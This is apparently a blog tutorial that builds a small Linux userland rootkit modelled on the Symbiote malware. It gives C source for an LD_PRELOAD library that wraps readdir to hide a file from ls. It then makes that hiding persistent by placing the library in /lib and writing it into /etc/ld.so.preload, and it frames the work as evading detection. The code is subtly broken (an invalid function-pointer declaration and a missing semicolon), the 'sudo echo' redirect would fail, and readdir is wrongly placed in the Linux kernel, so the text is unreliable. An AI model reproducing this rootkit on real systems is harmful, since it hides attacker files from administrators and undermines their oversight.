---
title: "Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)"
date: 2022-10-02T21:45:03+03:00
draft: false
---

# Overview

Recently I heard about a new malware called [Symbiote](https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat), which the researches are calling the "Nearly-Impossible-to-Detect Linux Threat". I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I've started to research it. 


I highly advice you to read through these articles first before we begin with the actual post:

 - [Hijack Execution Flow: Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006/)
 - [What Is the LD_PRELOAD?](https://www.baeldung.com/linux/ld_preload-trick-what-is)
 - [What is a Shared Library?](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)

# Implementation 

I decided to implement a very simple alternative of this malware just as a proof of concept since it was really interesting me. My idea is to create a file that will be hidden in the system.

First, if you already read the articles that I've linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.

What do we need first and how to hide a file from lets say a command like `ls`? With a little bit of investigating of how the `ls` works internally through the [source code](https://github.com/coreutils/coreutils/blob/master/src/ls.c) and the [linux manual page](https://man7.org/linux/man-pages/man1/ls.1.html)
We can see that internally we have a function that is called `print_dir`. I've truncated the comments of the original source code.

 ```c
 ...
static void
print_dir (char const *name, char const *realname, bool command_line_arg)
...
 ```


If we continue further down the function we can see the loop that actually iterates over the files

 ```c
...
  while (true)
    {
      errno = 0;
      next = readdir (dirp); // Here we can see that the loop iterates over readdir as long
      // as the pointer that readdir returns isn't null and the errno != 0
      if (next)
        {
          if (! file_ignored (next->d_name)) // we can see here that it the filename is
          // taken from the next variable, lets look through the source code of `readdir`
            {
      ...
```
Let's confirm that by invoking `nm` this will show us the dynamic symbols that are being loaded from shared libs.

```console
$ nm -D /usr/bin/ls | grep "readdir"
                 U readdir@GLIBC_2.2.5
```

Now I concluded that I need to search into the source code of `readdir` which is located [here](https://github.com/torvalds/linux/blob/master/fs/readdir.c) and the [linux manual page](https://man7.org/linux/man-pages/man3/readdir.3.html). The description more or less describes exactly what we concluded from the source code of `ls.c`. Lets see where we set that `d_name` variable.

```c
#include <dirent.h>

struct dirent *readdir(DIR *dirp); // Signature of the dirent
```

```c
struct dirent {
    ino_t          d_ino;       /* Inode number */
    off_t          d_off;       /* Not an offset; see below */
    unsigned short d_reclen;    /* Length of this record */
    unsigned char  d_type;      /* Type of file; not supported
                                    by all filesystem types */
    char           d_name[256]; /* Null-terminated filename */
};
```

> ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the `dirent` structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that `d_name` will exists since this field must be implemented on all POSIX systems.

Alright, let's start implementing our own function `readdir` that we will wrap the original one with. 

```c
/* libhidemyfile.c */
#define _GNU_SOURCE
#include <dirent.h> // Including the Directory Entry structure
// The dynamic linking header file so we can use the dlsym
// which will give us the address for the readdir symbol
#include <dlfcn.h>
#include <string.h> // So we can use the strstr

struct dirent *readdir(DIR *dirp) {
    struct *(handle)(DIR *);
    // https://man7.org/linux/man-pages/man3/dlsym.3.html
    // Search for RTLD_NEXT, basically it allow us to wrap
    // the original function
    handle = dlsym(RTLD_NEXT, "readdir")
    struct dirent *dp;

    // Iterating over the return values of our original `readdir`
    while((dp = handle(dirp))) {
        // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp->d_name`)
        // break the loop and go to the next entry, essentially skipping our file.
        if(strstr(dp->d_name, "syl.lys") == 0)
            break;
    }
    return dp;
}
```

This is what our final version of wrapper for `readdir` would look like. Now let's try to compile it.

```console
$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl
```

Flags: 
- [fPIC](https://stackoverflow.com/questions/5311515/gcc-fpic-option)
- `-shared` creates a shared object
- [-D_GNU_SOURCE flag / _GNU_SOURCE](https://stackoverflow.com/questions/8836707/explanation-of-d-gnu-source-why-to-use-it-and-when) - TLDR: We need it for `RTLD_NEXT`
- [-ldl](https://ubuntuforums.org/archive/index.php/t-1054717.html)


Now that we have shared object (*.so) file lets see how to use it in action.

# How to overwrite the exported symbols? `LD_PRELOAD`

- [What is LD_PRELOAD?](https://man7.org/linux/man-pages/man8/ld.so.8.html)

I advice you to read that first to get a better understanding of how it works.

The next thing that we are going to do is to test our shared library and see if it works. Lets run `ls` with our `libhidemyfile.so` loaded before anything else.

```console
$ ls
libhidemyfile.so  syl.lys
$ LD_PRELOAD=./libhidemyfile.so ls
libhidemyfile.so
```

As you can see we successfully implement a shared library that hides our file from `ls`, and not only that command, every command that uses `readdir` won't be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing `LD_PRELOAD` in front of every command.

## /etc/ld.so.preload

If you read carefully the man pages for `LD_PRELOAD` you should know that you won't be able to override functions in the standard search directories without properly setting your set-user-ID permissions. 

Instead we are going to use the `/etc/ld.so.preload` which does not suffer from that restrictions. This suffers from requiring root privileges but c'mon.. if you are here you will get those!

We first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.

```console
$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so
```

Then we just need to place our library dir in `ld.so.preload` file.

```console
$ sudo echo "libhidemyfile.so" > /etc/ld.so.preload
```

And if everything is good, executing `ls` or any of its aliases will hide our file from the output.

# End

If you reached here, thank you so much for the read. In the next part I will try to "completely" hide it from the system because now if we `cat` it despite not "reading" it in the directory would print us the contents of the file, but that will be the subject of the next post.
